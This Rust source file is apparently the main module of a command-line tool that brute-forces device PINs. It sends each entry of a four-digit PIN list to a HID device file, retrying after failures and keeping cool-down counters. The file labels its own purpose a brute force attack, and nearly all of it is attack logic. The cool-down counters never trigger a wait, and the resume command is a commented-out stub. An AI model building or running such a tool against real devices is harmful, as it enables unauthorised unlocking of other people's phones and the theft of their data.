use clap::Parser;
use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings};
use crossterm::{cursor, terminal, ExecutableCommand, QueueableCommand};
use log::{debug, error, info, trace, warn, LevelFilter};
use simple_logger::SimpleLogger;
use std::{io::stdout, process::exit, time::Duration};

mod common;
mod hid;
mod pin_lists;
mod timeout;

fn main() {
    let cli = Cli::parse();
    let mut logger = SimpleLogger::new();

    logger = match cli.verbose {
        0 => logger.with_level(LevelFilter::Info),
        1 => logger.with_level(LevelFilter::Debug),
        _ => logger.with_level(LevelFilter::Trace),
    };

    logger.env().init().unwrap();
    info!("Starting app...");

    ctrlc::set_handler(move || {
        // Ensure the cursor is visible before exiting
        stdout()
            .queue(terminal::Clear(terminal::ClearType::FromCursorDown))
            .unwrap()
            .queue(cursor::MoveToColumn(0))
            .unwrap()
            .execute(cursor::Show)
            .unwrap();
        error!("Received a signal indicating termination, exiting...");
        exit(1);
    })
    .expect("Error setting Ctrl-C handler");

    let settings = parse_cli_args(&cli);
    debug!("Loaded settings: {:?}", settings);

    match cli.command {
        Some(Commands::Start) => start(settings),
        Some(Commands::Resume(args)) => resume(settings, args),
        None => {
            error!("No command provided. Use --help for usage information.");
            exit(1);
        }
    }

    debug!("Finished app...");
}

fn start(settings: Settings) {
    debug!("Starting brute force attack...");

    let mut cool_down_index = 0;
    let mut cool_down_count = 0;

    for pin in pin_lists::PIN_LIST_4 {
        let mut result = hid::write_to_device_file(&settings.device, pin);
        let mut attempts = 12;

        while let Err(e) = result {
            attempts -= 1;
            warn!("Failed to send pin: {}", pin);
            debug!("Attempts remaining: {}", attempts);
            trace!("Error: {}", e);

            if attempts == 0 {
                error!("12 failed attempts over 2 minutes, exiting...");
                exit(126); // Command invoked cannot execute
            }

            // Wait for 10 seconds before trying again
            timeout::set_time_out(Duration::from_secs(10), "Retry sending pin in");

            result = hid::write_to_device_file(&settings.device, pin);
        }

        if settings.cool_down[cool_down_index].count == -1 {
            continue;
        }

        if cool_down_count != settings.cool_down[cool_down_index].count {
            cool_down_count += 1;
        } else {
            cool_down_index += 1;
            cool_down_count = 0;
        }
    }
}

fn resume(settings: Settings, args: ResumeArgs) {
    info!("Resuming brute force attack from pin: {}", args.pin);
    // let result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, "Hello World");
    // match result {
    //     Ok(_) => info!("Brute force attack complete"),
    //     Err(e) => error!("Failed to start brute force attack: {}", e),
    // }
}
